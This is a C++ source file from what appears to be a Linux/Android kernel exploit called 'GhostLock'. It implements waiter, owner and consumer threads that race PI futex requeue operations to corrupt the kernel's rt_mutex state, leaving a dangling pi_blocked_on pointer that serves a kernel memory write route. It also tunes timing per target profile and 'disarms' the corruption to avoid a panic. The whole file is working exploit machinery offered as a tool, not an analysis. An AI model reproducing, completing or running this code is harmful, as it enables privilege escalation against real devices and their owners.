/*
 * GhostLock 闂?PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "race/threads.hpp"

#include "attack/ops.hpp"
#include "profile/model.h"
#include "route/route_controller.h"
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"

using namespace ghostlock;

namespace ghostlock::race {
    namespace {
        constexpr uint32_t kFastRepairSettleUs = 5000;
        constexpr uint32_t kFastRepairWaitUs = 20000;
        constexpr uint32_t kChainTimeoutFloorUs = 10000;
        constexpr uint32_t kOwnerQueueDeadlineMs = 200;

        /* The shared settle and waiter timeout used by run() and the owner's
         * chain deadline. Keeping one source makes the ordering check below
         * meaningful on both the main route and the fast repair. */
        uint32_t route_settle_us() noexcept {
            return session::g_exploit_session.race.fast_repair.load()
                       ? kFastRepairSettleUs
                       : session::g_exploit_session.profile.race_setup_settle_us();
        }

        uint32_t route_waiter_timeout_us() noexcept {
            if (session::g_exploit_session.race.fast_repair.load()) {
                return kFastRepairWaitUs;
            }
            constexpr uint64_t kMicrosPerMilli = 1000;
            return static_cast<uint32_t>(
                static_cast<uint64_t>(
                    session::g_exploit_session.profile.race_route_wait_ms()) *
                kMicrosPerMilli);
        }

        /* The owner must still be queued on chain_futex when the requeue runs,
         * and must time out before the waiter's cleanup. Derive the deadline
         * from the race setup settle (not the W1 verification delay), leaving
         * at least one settle interval after the requeue. Returns 0 when the
         * profile's ordering cannot satisfy both constraints. */
        uint32_t chain_timeout_us() noexcept {
            const uint32_t settle_us = route_settle_us();
            const uint32_t waiter_us = route_waiter_timeout_us();
            if (waiter_us == 0) return 0;
            uint64_t chain_us = settle_us != 0
                                    ? static_cast<uint64_t>(settle_us) * 2
                                    : 100000;
            if (chain_us < kChainTimeoutFloorUs) chain_us = kChainTimeoutFloorUs;
            if (waiter_us != 0 &&
                chain_us >= static_cast<uint64_t>(waiter_us)) {
                chain_us = static_cast<uint64_t>(waiter_us) / 2;
            }
            if (chain_us <= settle_us) return 0;
            return static_cast<uint32_t>(chain_us);
        }

        bool read_proc_line(const char *path, char *buffer, size_t capacity) noexcept {
            const int32_t fd = open(path, O_RDONLY | O_CLOEXEC);
            if (fd < 0) return false;
            const ssize_t n = read(fd, buffer, capacity - 1);
            (void) close(fd);
            if (n <= 0) return false;
            buffer[n] = 0;
            return true;
        }

        /* A pre-syscall flag only proves intent. /proc/self/task/<tid>/syscall
         * reports the syscall a blocked task is actually sleeping in, so the
         * main thread can wait for FUTEX_LOCK_PI instead of guessing. Older or
         * restricted kernels may mask it; wchan still names the rt_mutex sleep
         * point there. */
        bool owner_queued_on_chain(int32_t tid) noexcept {
            char path[64];
            char line[256];
            (void) snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
            if (read_proc_line(path, line, sizeof(line))) {
                if (strncmp(line, "running", 7) != 0) {
                    long syscall_nr = -1;
                    unsigned long op = 0;
                    if (sscanf(line, "%ld %*s %lx", &syscall_nr, &op) == 2) {
                        if (syscall_nr == SYS_futex &&
                            (op & static_cast<unsigned long>(FUTEX_CMD_MASK)) ==
                                static_cast<unsigned long>(FUTEX_LOCK_PI)) {
                            return true;
                        }
                        /* A different syscall means the owner is not parked on
                         * the chain futex yet (or already timed out). */
                        if (syscall_nr >= 0) return false;
                    }
                } else {
                    return false;
                }
            }
            (void) snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
            if (read_proc_line(path, line, sizeof(line))) {
                if (strstr(line, "rt_mutex") != nullptr ||
                    strstr(line, "futex") != nullptr) {
                    return true;
                }
            }
            /* Some builds hide syscall/wchan. Between storing owner_tid and the
             * chain lock the only blocking point is FUTEX_LOCK_PI, so an
             * uninterruptible/sleeping state is still evidence of queueing. */
            (void) snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
            if (read_proc_line(path, line, sizeof(line))) {
                char *close = strrchr(line, ')');
                if (close != nullptr && close[1] == ' ' &&
                    (close[2] == 'S' || close[2] == 'D')) {
                    return true;
                }
            }
            return false;
        }

        bool wait_for_owner_chain_queue(const PiRace &race) noexcept {
            struct timespec started{};
            SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
            int32_t tid = 0;
            for (;;) {
                if (race.owner_stop.load() || race.owner_chain_done.load()) {
                    return false;
                }
                tid = race.owner_tid.load();
                if (tid > 0) break;
                if (runtime_time::runtime_elapsed_ms(&started) >=
                    static_cast<double>(kOwnerQueueDeadlineMs)) {
                    return false;
                }
                usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
            }
            for (;;) {
                if (race.owner_stop.load() || race.owner_chain_done.load()) {
                    return false;
                }
                if (owner_queued_on_chain(tid)) return true;
                if (runtime_time::runtime_elapsed_ms(&started) >=
                    static_cast<double>(kOwnerQueueDeadlineMs)) {
                    return false;
                }
                usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
            }
        }
    } // namespace

    void *waiter_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        const memory::WriteRequest *request = race->request;
        support::disable_rseq_for_thread();
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->waiter_tid.store(tid);
        if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            pr_error("waiter lock chain errno=%d\n", errno);
        race->waiter_ready.store(1);
        while (!race->owner_started.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        const uint64_t wait_ns = static_cast<uint64_t>(route_waiter_timeout_us()) * 1000ULL;
        timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
        timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
        if (timeout.tv_nsec >= 1000000000L) {
            timeout.tv_sec++;
            timeout.tv_nsec -= 1000000000L;
        }
        race->waiter_waiting.store(1);
        errno = 0;
        (void) support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
                                 &timeout, &race->target_futex, 0);
        route::RouteController controller;
        controller.init(race, &session::g_exploit_session.profile);
        race->route_status = controller.execute(request);
        if (controller.fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
            /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. */
            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        race->route_done.store(1);
        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!race->owner_chain_done.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        /* Original design: the owner holds target_futex, the waiter parks with
         * FUTEX_WAIT_REQUEUE_PI and the requeue fails with EAGAIN; the waiter's
         * own timeout then wakes it and it runs the route. */
        long lock_target = support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        while (!race->waiter_ready.load() &&
               !race->owner_stop.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        if (race->owner_stop.load()) {
            if (lock_target == 0)
                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            return nullptr;
        }
        race->owner_started.store(1);
        /* Original chain design: the owner blocks on the chain futex held by
         * the waiter, forming the PI cycle owner->chain->waiter that makes
         * task_blocks_on_rt_mutex() return -EDEADLK and rt_mutex_start_proxy_lock()
         * call remove_waiter() from the requeue thread. The main thread waits
         * for this task to actually enter FUTEX_LOCK_PI (see
         * wait_for_owner_chain_queue) before it requeues. */
        const int32_t owner_tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->owner_tid.store(owner_tid);
        {
            struct timespec ct;
            SYSCHK(clock_gettime(CLOCK_REALTIME, &ct));
            long chain_ns = static_cast<long>(chain_timeout_us()) * 1000L;
            if (chain_ns <= 0) {
                pr_error("owner chain timeout ordering invalid\n");
                chain_ns = static_cast<long>(kChainTimeoutFloorUs) * 1000L;
            }
            ct.tv_nsec += chain_ns;
            if (ct.tv_nsec >= 1000000000L) {
                ct.tv_sec += ct.tv_nsec / 1000000000L;
                ct.tv_nsec %= 1000000000L;
            }
            errno = 0;
            long cr = support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, &ct,
                                        nullptr, 0);
            pr_info("owner chain timed lock ret=%ld errno=%d\n", cr, errno);
        }
        /* Release target before the waiter's 400 ms timeout cleanup runs:
         * rt_mutex_cleanup_proxy_lock() then takes the lock itself and skips
         * remove_waiter(), leaving the stale pi_blocked_on in place. */
        if (lock_target == 0) {
            errno = 0;
            (void) support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0,
                                        nullptr, nullptr, 0);
            lock_target = -1;
        }
        race->owner_chain_done.store(1);
        while (!race->owner_stop.load()) sleep(1);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        if (!kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu))) {
            support::fail_stop_dirty_race("consumer cpu affinity", errno);
        }
        pr_info("consumer thread running on cpu=%d race=%p\n", sched_getcpu(),
                static_cast<void *>(race));
        int32_t seen = 0;
        while (!race->consumer_stop.load()) {
            int32_t seq = race->consumer_go.load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile (


                "yield"
                ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = race->waiter_tid.load();
            int32_t calls_this_seq = 0;
            while (!race->consumer_stop.load() &&
                   race->consumer_go.load() == seq) {
                uint32_t delay_usec = race->route_delay_usec.load();
                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
                for (uint32_t burst = 0;
                     burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                    if (race->consumer_stop.load() ||
                        race->consumer_go.load() != seq)
                        break;
                    race->consumer_calls.fetch_add(1);
                    race->consumer_inflight.store(1);
                    errno = 0;
                    /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                    int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                            ? (calls_this_seq % 19) + 1
                                            : kernel::PSELECT_CONSUMER_NICE;
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    if (sched_ret != 0) {
                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                        long fret = support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                    }
                    if (sched_ret == 0) race->consumer_success.fetch_add(1);
                    race->consumer_inflight.store(0);
                    calls_this_seq++;
                    if (static_cast<uint32_t>(calls_this_seq) >=
                        session::g_exploit_session.profile.select_consumer_max_calls()) {
                        race->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    void reset_main_route_state(void) {
        int32_t fast_repair = session::g_exploit_session.race.fast_repair.load();
        if (!session::g_exploit_session.race.reset(
            fast_repair ? 5000 : session::g_exploit_session.profile.select_enter_delay_us(),
            config::runtime_config_snapshot().main_cpu,
            config::runtime_config_snapshot().consumer_cpu)) {
            support::fail_stop_dirty_race("reset with live PI workers", EBUSY);
        }
        session::g_exploit_session.race.fast_repair.store(fast_repair);
        if (chain_timeout_us() == 0) {
            support::fail_stop_dirty_race(
                "chain timeout must sit between the requeue settle and the waiter timeout",
                EINVAL);
        }
    }
} // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
    while (!waiter_waiting.load() || !owner_started.load())
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    pr_info("[route] waiter parked; owner started\n");
    /* Wait until the owner is actually sleeping in FUTEX_LOCK_PI on the chain
     * futex before requeueing, so the PI cycle owner->chain->waiter exists when
     * the requeue runs and the requeue returns -EDEADLK. A pre-syscall flag is
     * not enough: the owner can be descheduled before it enters the kernel. */
    if (!wait_for_owner_chain_queue(*this)) {
        pr_warning("[route] owner did not queue on chain before deadline\n");
        return route::RouteStatus{
            .code = route::ROUTE_DIRTY_FAILURE,
            .step = 22,
            .error_number = ETIMEDOUT,
        };
    }
    usleep(route_settle_us());
    if (owner_chain_done.load() || owner_stop.load()) {
        pr_warning("[route] owner left the chain before requeue\n");
        return route::RouteStatus{
            .code = route::ROUTE_DIRTY_FAILURE,
            .step = 22,
            .error_number = ETIMEDOUT,
        };
    }
    errno = 0;
    long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                reinterpret_cast<void *>(1),
                                &target_futex, 0);
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from profile::TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    struct timespec wait_started{};
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
    const double timeout_ms = static_cast<double>(
        session::g_exploit_session.profile.race_route_done_timeout_ms());
    while (!route_done.load()) {
        if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
            return route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 21,
                .error_number = ETIMEDOUT,
            };
        }
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    }
    const route::RouteStatus status = route_status;
    const int32_t calls = consumer_calls.load();
    const int32_t success = consumer_success.load();
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {
    /* Create, synchronize, stop and join one explicitly owned PI race. */
    Status run_main_route_threads(const memory::WriteRequest &request) {
        reset_main_route_state();
        pr_info("[route] creating waiter/owner/consumer\n");
        int32_t error = session::g_exploit_session.race.start_threads(
            waiter_thread, owner_thread, consumer_thread, &request);
        if (error) {
            if (session::g_exploit_session.race.route_status.code ==
                route::ROUTE_DIRTY_FAILURE) {
                support::fail_stop_dirty_race(
                    "partial PI worker startup cleanup", error);
            }
            session::g_exploit_session.race.route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
            pr_warning("PI race thread creation failed errno=%d\n", error);
            return 0;
        }
        route::RouteStatus status = session::g_exploit_session.race.run();
        if (status.code == route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route_done deadline", status.error_number);
        }
        session::g_exploit_session.race.request_stop();
        const int32_t join_error = session::g_exploit_session.race.join();
        if (join_error != 0) {
            support::fail_stop_dirty_race("PI worker join", join_error);
        }
        pr_info("[route] threads joined\n");
        return status.code == route::ROUTE_OK;
    }
} // namespace ghostlock::race
